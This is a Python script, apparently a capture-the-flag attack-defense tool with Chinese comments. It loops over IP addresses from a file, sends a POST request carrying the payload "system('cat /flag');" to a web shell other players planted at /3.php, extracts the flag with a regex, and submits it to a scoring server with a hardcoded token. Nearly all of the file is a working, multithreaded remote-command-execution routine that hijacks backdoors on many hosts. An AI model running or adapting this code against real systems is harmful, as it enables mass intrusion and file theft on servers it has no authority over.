import time

import requests
import re
import hashlib
import threading
import time
proxies = {"http": None, "https": None}

def submitFlag(flag,ip): #如果手动提交flag则这个函数不要管，把58行注释掉就行
	url = 'http://192.168.1.100/submit'
	data = {"flag":flag,"token":"s7svn5w23vHw8ewBcF"}
	try:
		req = requests.post(url, data=data, proxies=proxies,timeout=5) #请确定提交flag是不是用post提交
		#req = requests.get(url, headers=headers,timeout=5,params=data)
		if(req.status == 404):
			print('提交flag页面不正确，请检查submitFlag函数的url参数，本次ip:',ip,'flag:',flag)
		elif(req.status == 200):
			print(ip,flag,req.text)
	except requests.exceptions.ConnectTimeout:
		print('提交flag的服务器出错，怀疑已经宕机，请检查submit_flag_url参数，本次ip:',ip,'flag:',flag)
		return False
	except:
		print('{} {} 提交失败!'.format(ip,flag))

def getIP(filePath):
	IPList = []
	with open(filePath,'r') as ips:
		a = ips.read().split('\n')
		for i in a:
			if(i != ''):
				IPList.append(i)
	return IPList
def Async(f):
    def wrapper(*args, **kwargs):
        thr = threading.Thread(target=f, args=args, kwargs=kwargs)
        thr.start()

    return wrapper

@Async
def getFlag(ip): #通过别人的木马来获取flag
	flag=''
	url='http://'+ip+'/3.php' #别人写马的位置
	data = {"cmd":"system('cat /flag');"} #通过别人的木马来获取flag的payload key是木马的参数,value是payload
	try:
		req = requests.post(url=url, data=data, proxies=proxies,timeout=5) #默认为post,如果实际是get请注释这一行，同时解开下一行的注释
		#req = requests.get(url=url,proxies=proxies,timeout=5,params=data)
		if(req.status_code == 404):
			print(ip,'shell不存活')
		if(req.status_code == 200):
			print(ip,'命令执行结果:',req.text)
		result=re.findall(r'flag\{.+\}', req.text) # 匹配flag的正则表达式，默认是flag{xxx},请根据实际情况合理更改
		if len(result) > 0:
			flag = result[0]
			submitFlag(flag,ip)
		elif(req.status_code == 200):
			print(ip,'shell存活!!!但是获取不了flag，请做如下检查：\n      1.shell是否能正常执行命令\n      2.发包方法，默认是post,如果是get请更改49行附近的请求方法\n      3.getFlag函数的data参数里面的payload\n      4.flag正则匹配不对，默认是flag{xxx}，如果不是请检查getFlag的result参数')
	except requests.exceptions.ConnectTimeout:
		print('不存在ip:',ip,'请检查ip.txt')
		return False
	except Exception as e:
		print(e)
		pass

if __name__=='__main__':
	for ip in getIP('ip.txt'):
		getFlag(ip)
		while(threading.active_count() > 20): #线程数量
			time.sleep(1)
